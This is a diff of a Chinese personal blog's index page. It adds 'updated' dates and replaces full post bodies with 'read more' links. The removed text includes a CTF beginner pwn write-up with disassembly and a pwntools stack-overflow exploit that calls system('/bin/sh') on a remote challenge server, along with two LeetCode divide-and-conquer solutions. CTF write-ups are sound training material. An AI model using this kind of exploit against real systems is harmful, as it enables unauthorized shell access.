@@ -213,10 +213,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-27 19:55:25 / 修改时间：20:29:19" itemprop="dateCreated datePublished" datetime="2022-03-27T19:55:25+08:00">2022-03-27</time>
+              <time title="创建时间：2022-03-27 19:55:25" itemprop="dateCreated datePublished" datetime="2022-03-27T19:55:25+08:00">2022-03-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-29 01:14:04" itemprop="dateModified" datetime="2022-03-29T01:14:04+08:00">2022-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -247,17 +253,14 @@
 
       
           <h2 id="一、Level-2"><a href="#一、Level-2" class="headerlink" title="一、Level_2"></a>一、Level_2</h2><p>pwn到手第一步，先玩一玩看看.</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" alt=""></p>
-<p>简单的输入提示，基本上获得不了什么信息。</p>
-<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call  system 和 read，这给了我们布栈的空间。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
-<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 “/bin/sh”的地址。</p>
-<p>当ret时，我们回到了call   0x8048320 <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x73;&#x79;&#x73;&#x74;&#101;&#109;&#x40;&#x70;&#x6c;&#116;">&#x73;&#x79;&#x73;&#x74;&#101;&#109;&#x40;&#x70;&#x6c;&#116;</a>，此时esp由于pop eip的效果，此时内部存放着”/bin/sh”的地址，这也顺利地完成了system函数的参数布置。</p>
-<p>Python的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -299,10 +302,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-27 18:21:04 / 修改时间：18:29:06" itemprop="dateCreated datePublished" datetime="2022-03-27T18:21:04+08:00">2022-03-27</time>
+              <time title="创建时间：2022-03-27 18:21:04" itemprop="dateCreated datePublished" datetime="2022-03-27T18:21:04+08:00">2022-03-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-29 01:14:30" itemprop="dateModified" datetime="2022-03-29T01:14:30+08:00">2022-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -331,13 +340,14 @@
           <h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给定一个数组 points ，其中 points[i] = [xi, yi] 表示 X-Y 平面上的一个点，并且是一个整数 k ，返回离原点 (0,0) 最近的 k 个点。</p>
 <p>这里，平面上两点之间的距离是 欧几里德距离（ √(x1 - x2)2 + (y1 - y2)2 ）。</p>
 <p>你可以按 <strong>任何顺序</strong> 返回答案。除了点坐标的顺序之外，答案 确保 是 <strong>唯一</strong> 的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入：points = [[1,3],[-2,2]], k = 1</span><br><span class="line">输出：[[-2,2]]</span><br><span class="line">解释： </span><br><span class="line">(1, 3) 和原点之间的距离为 sqrt(10)，</span><br><span class="line">(-2, 2) 和原点之间的距离为 sqrt(8)，</span><br><span class="line">由于 sqrt(8) &lt; sqrt(10)，(-2, 2) 离原点更近。</span><br><span class="line">我们只需要距离原点最近的 K = 1 个点，所以答案就是 [[-2,2]]。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：points = [[3,3],[5,-1],[-2,4]], k = 2</span><br><span class="line">输出：[[3,3],[-2,4]]</span><br><span class="line">（答案 [[-2,4],[3,3]] 也会被接受。）</span><br></pre></td></tr></table></figure>
-<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><h4 id="思路一：排序"><a href="#思路一：排序" class="headerlink" title="思路一：排序"></a>思路一：排序</h4><p>显然是非常直观的思路，我们可以直接排序数组，返回前K个数。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;points.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>,<span class="type">int</span>&gt;(i ,points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; (res.<span class="built_in">begin</span>(),res.<span class="built_in">begin</span>() + k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>我们这次主要是学习分治的思想，因此我们可以考虑使用快排的思路（其实algorithm的sort也是快排），当我们完成一次快排，我们可以将数组分为两个部分，因此我们可以借此不断将数组分割来找到第K个数。</p>
-<p>代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; dist;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">partition</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points,<span class="type">int</span> beg,<span class="type">int</span> end)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = beg;</span><br><span class="line">        <span class="type">int</span> j = end;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; p = points[beg];</span><br><span class="line">        <span class="type">int</span> p_dist = dist[beg];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[j] &gt; p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[i] = points[j];</span><br><span class="line">                dist[i] = dist[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; dist[i] &lt;= p_dist)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">            &#123;</span><br><span class="line">                points[j] = points[i];</span><br><span class="line">                dist[j] = dist[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        points[j] = p;</span><br><span class="line">        dist[j] = p_dist;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">select_random</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> pivot = <span class="built_in">partition</span>(points, left, right);</span><br><span class="line">        <span class="keyword">if</span> (pivot == k)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pivot &lt; k)</span><br><span class="line">        &#123;	<span class="comment">// 注意此时我们使用的是数组的引用，因此我们的K未发生变化</span></span><br><span class="line">            <span class="built_in">select_random</span>(points, pivot + <span class="number">1</span>, right, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">select_random</span>(points, left, pivot - <span class="number">1</span>, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">kClosest</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, <span class="type">int</span> k) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> tar = k - <span class="number">1</span>;</span><br><span class="line">        dist.<span class="built_in">resize</span>(points.<span class="built_in">size</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; points.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dist[i] = (points[i][<span class="number">0</span>] * points[i][<span class="number">0</span>] + points[i][<span class="number">1</span>] * points[i][<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">select_random</span>(points, <span class="number">0</span>, points.<span class="built_in">size</span>() - <span class="number">1</span>, tar);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(points.<span class="built_in">begin</span>(), points.<span class="built_in">begin</span>() + k);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/27/blog0007-leetcode-%E5%88%86%E6%B2%BB-%E6%9C%80%E6%8E%A5%E8%BF%91%E5%8E%9F%E7%82%B9%E7%9A%84K%E4%B8%AA%E7%82%B9/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -379,10 +389,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-27 14:30:51 / 修改时间：18:38:01" itemprop="dateCreated datePublished" datetime="2022-03-27T14:30:51+08:00">2022-03-27</time>
+              <time title="创建时间：2022-03-27 14:30:51" itemprop="dateCreated datePublished" datetime="2022-03-27T14:30:51+08:00">2022-03-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-29 01:14:38" itemprop="dateModified" datetime="2022-03-29T01:14:38+08:00">2022-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -409,25 +425,14 @@
 
       
           <h2 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h2><p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ul>
-<li>1 &lt;= expression.length &lt;= 20</li>
-<li>输入表达式中的所有整数值在范围 [0, 99] </li>
-<li>expression 由数字和算符 ‘+’、’-‘ 和 ‘*’ 组成。</li>
-</ul>
-<h2 id="二、我的思路"><a href="#二、我的思路" class="headerlink" title="二、我的思路"></a>二、我的思路</h2><p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为</p>
-<script type="math/tex; mode=display">
-2*(3-4*5)\\
-2*3-(4*5)</script><p>但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理：</p>
-<script type="math/tex; mode=display">
-((2*3)-4)*5</script><p>但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<script type="math/tex">2*3</script>时，我们就把式子转化为$(6-4)*5$，这又是我们之前处理的范围了。</p>
-<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式$c$，我们可以将其拆分为$a$ op $b$，这样我们就得到了分治处理的思路。</p>
-<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
-<p>我的代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2 , <span class="type">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; v3;</span><br><span class="line">        <span class="type">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -535,10 +540,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-16 00:07:42 / 修改时间：00:47:13" itemprop="dateCreated datePublished" datetime="2022-01-16T00:07:42+08:00">2022-01-16</time>
+              <time title="创建时间：2022-01-16 00:07:42" itemprop="dateCreated datePublished" datetime="2022-01-16T00:07:42+08:00">2022-01-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-29 01:14:48" itemprop="dateModified" datetime="2022-03-29T01:14:48+08:00">2022-03-29</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -574,7 +585,14 @@
       
           <h2 id="一、题目重点"><a href="#一、题目重点" class="headerlink" title="一、题目重点"></a>一、题目重点</h2><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片"></p>
 <p>我们首先来看一下</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
